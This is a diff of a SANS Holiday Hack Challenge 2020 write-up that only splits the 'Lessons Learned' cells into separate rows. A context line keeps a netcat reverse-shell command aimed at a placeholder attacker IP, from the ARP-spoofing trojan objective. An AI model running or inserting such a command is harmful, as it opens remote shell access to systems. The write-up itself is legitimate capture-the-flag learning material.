@@ -127,7 +127,9 @@ Open the HID lock in the Workshop. Talk to Bushy Evergreen near the talk tracks 
 
 Lessons Learned |
 --------------- |
-When something doesn't work right the first time, think about what information you might be missing. Also help files are very help-ful. Don't overlook them. Lastly, it really isn't all that hard to simulate badge authentication! |
+When something doesn't work right the first time, think about what information you might be missing. |
+Also help files are very help-ful. Don't overlook them. |
+It really isn't all that hard to simulate badge authentication! |
 
 # Objective 6: Splunk Challenge
 
@@ -270,7 +272,8 @@ It works!
 
 Lessons Learned |
 --------------- |
-Some actions or actuations (like driving a car or sled) might not seem like they are digital in nature, but they are! Also, when looking for troublemakers, it is important to reduce noise as much as possible.|
+Some actions or actuations (like driving a car or sled) might not seem like they are digital in nature, but they are! |
+When looking for troublemakers, it is important to reduce noise as much as possible.|
 
 
 # Objective 8: Broken Tag Generator
@@ -353,7 +356,8 @@ Here's the result!
 
 Lessons Learned |
 --------------- |
-Some responses that don't show up in your browser do show up Burp. Also, don't underestimate what files may be available to you through LFI.|
+Some responses that don't show up in your browser do show up Burp. |
+Also, don't underestimate what files may be available to you through LFI.|
 
 
 # Objective 9: ARP Shenanigans
@@ -460,7 +464,9 @@ nc -e /bin/sh [attacking ip] 4444
 
 Lessons Learned |
 -------------- |
-Learned critical concepts and practical application when it comes to ARP and DNS spoofing. Learned setup for a Linux binary trojan. I had done none of these things before Holiday Hack 2020. Getting that binary to do a callback and give me a shell was aweXome! | 
+Learned critical concepts and practical application when it comes to ARP and DNS spoofing. |
+Learned setup for a Linux binary trojan. | 
+Getting that binary to do a callback and give me a shell was aweXome! | 
 
 
 # Objective 10: Defeat Fingerprint Sensor
@@ -551,7 +557,9 @@ Here's the final script that retrieves he predicted values:
 
 Lessons Learned |
 --------------- |
-When it comes to computers, everything is deterministic, including random numbers! Be very careful what assumptions you're making when you're using random numbers to make an application or component more secure! Also, you can split a 64bit number in half to make a 32bit number!! Additionaly, a deeper understanding of 32bit vs. 64bit helped me explain bits and registers to my 11-year-old. Finally, I had NO concept of Endianness until Holiday Hack 2020. But now I do! |
+When it comes to computers, everything is deterministic, including random numbers! Be very careful what assumptions you're making when you're using random numbers to make an application or component more secure! | 
+You can split a 64bit number in half to make a 32bit number!! Additionaly, a deeper understanding of 32bit vs. 64bit helped me explain bits and registers to my 11-year-old. | 
+Finally, I had NO concept of Endianness until Holiday Hack 2020. But now I do! |
 
 
 # Objective 11b: Naughty/Nice List with Blockchain Investigation Part 2
